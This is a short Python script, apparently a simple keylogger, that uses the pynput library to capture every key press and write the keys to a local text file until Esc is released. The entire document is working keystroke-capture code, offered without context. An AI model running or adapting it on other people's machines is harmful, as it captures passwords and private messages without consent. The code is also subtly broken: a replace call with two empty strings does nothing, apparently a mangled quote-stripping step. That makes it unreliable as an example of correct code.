from pynput.keyboard import Key, Listener
a_keys = []
def functionPerkey(key):
    a_keys.append(key)
    storekeysinfile(a_keys)
def storekeysinfile(keys):
    with open('keylogdetails.txt', 'w') as log:
        for key in keys:
            
            k = str(key).replace("", "")
            log.write(k)

def onkeyrelease(key):
    if key == Key.esc:
  
        return False

with Listener(
    on_press=functionPerkey,
    on_release=onkeyrelease
) as the_Listener:
    the_Listener.join()
